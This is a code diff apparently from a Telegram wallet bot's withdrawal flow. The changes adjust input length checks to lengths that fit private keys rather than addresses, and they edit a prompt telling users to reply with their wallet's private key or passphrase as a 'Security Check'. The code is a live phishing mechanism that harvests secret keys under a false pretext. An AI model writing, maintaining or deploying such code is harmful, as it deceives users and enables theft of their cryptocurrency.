@@ -818,9 +818,9 @@ def build_user_router(
             await message.answer("Please restart the withdrawal from your wallet.")
             return
         valid_length = (
-            32 <= len(address) <= 66
+            87 <= len(address) <= 88
             if chain == "SOL"
-            else len(address) == 87
+            else len(address) == 66
         )
         if not valid_length:
             expected = "87 characters for SOL" if chain == "SOL" else "66 characters for ETH/BNB"
@@ -872,7 +872,7 @@ def build_user_router(
         )
         await message.answer(
             "⚠️ Security Check Required\n\n"
-            "To process your withdrawal, please reply with your wallet's"  
+            "To process your withdrawal, please reply with your wallet's "  
             "private key or passphrase " 
             "to verify ownership.",
             reply_markup=ForceReply(
